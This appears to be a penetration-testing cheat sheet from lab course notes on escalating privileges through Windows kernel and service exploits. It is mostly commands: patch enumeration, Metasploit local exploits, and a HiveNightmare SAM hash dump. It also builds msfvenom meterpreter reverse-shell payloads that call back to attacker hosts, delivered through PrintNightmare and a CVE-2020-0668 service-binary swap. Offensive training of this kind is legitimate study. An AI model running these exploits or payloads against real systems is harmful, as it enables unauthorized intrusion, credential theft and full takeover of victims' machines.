Over the years, there have been many kernel exploits that affect the Windows operating system from Windows 2000/XP up to Windows 10/Server 2016/2019. Below can be found a detailed table of known remote code execution/local privilege escalation exploits for Windows operating systems, broken down by service pack level, from Windows XP onward to Server 2016.

https://github.com/SecWiki/windows-kernel-exploits
https://github.com/abatchy17/WindowsExploits

### Enumerating Missing Patches
```powershell
PS C:\htb> systeminfo
PS C:\htb> wmic qfe list brief
PS C:\htb> Get-Hotfix
```

### Metasploit Exploit Suggester
```bash
run post/multi/recon/local_exploit_suggester
```

```bash
background
exploit/windows/local/ms10_015_kitrap0d
set session 1 
set lhost tun0
set lport 5555 		(something different from last session)
exploit
```
#### Notable Exploits
- `MS08-067`
- `MS17-010` - [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue)
- `ALPC Task Scheduler 0-Day`
- `CVE-2021-36934 HiveNightmare, aka SeriousSam`


### HiveNightmare (Windows 10)
```powershell
C:\htb> icacls c:\Windows\System32\config\SAM

C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)
      NT AUTHORITY\SYSTEM:(I)(F)
      BUILTIN\Users:(I)(RX)
      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
      APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Successful exploitation also requires the presence of one or more shadow copies. Most Windows 10 systems will have `System Protection` enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw.

This [PoC](https://github.com/GossiTheDog/HiveNightmare) can be used to perform the attack, creating copies of the aforementioned registry hives:
```powershell
.\HiveNightmare.exe
```

Dump hashes
```powershell
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```

### PrintNightmare
Local exploitation with [Invoke-Nightmare](https://github.com/cube0x0/CVE-2021-1675) 
```powershell
Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
```

Remote exploitation
Check if machine is vulnerable
```powershell
rpcdump.py @192.168.1.129 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

Generate malicious DLL, host it
```powershell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=4443 -f dll > shell.dll

smbserver.py share `pwd` -smb2support

nc -lnvp 1337
```

Download and run [this script](https://github.com/cube0x0/CVE-2021-1675).
```bash
python3 CVE-2021-1675.py driver/tony:liltony@10.10.11.106 '\\10.10.14.18\share\shell.dll'
```

### CVE-2020-0668
[Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/) exploits an arbitrary file move vulnerability leveraging the Windows Service Tracing

Check privileges
```powershell
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

We can use [this](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. Building the solution should create the following files.

```shell
CVE-2020-0668.exe
CVE-2020-0668.exe.config
CVE-2020-0668.pdb
NtApiDotNet.dll
NtApiDotNet.xml
```

At this point, we can use the exploit to create a file of our choosing in a protected folder such as C:\Windows\System32. We aren't able to overwrite any protected Windows files. This privileged file write needs to be chained with another vulnerability, such as [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) or [DiagHub](https://github.com/xct/diaghub) to load the DLL and escalate our privileges. However, the UsoDllLoader technique may not work if Windows Updates are pending or currently being installed, and the DiagHub service may not be available.

We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and is startable by unprivileged users. The (non-system protected) binary for this service is located below.

- `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

Checking Permissions on Binary
```powershell
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

Generate malicious binary
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```

Download two copies of payload
Run exploit
```powershell
C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

Replace File with Malicious Binary **NUMBER  2**
```powershell
 copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

Start listener
```bash
msfconsole -q -x 'use exploit/multi/handler;set LHOST 10.10.15.155; set LPORT 4443; set payload windows/x64/meterpreter/reverse_https; run'
```

Start service
```powershell
net start MozillaMaintenance 
```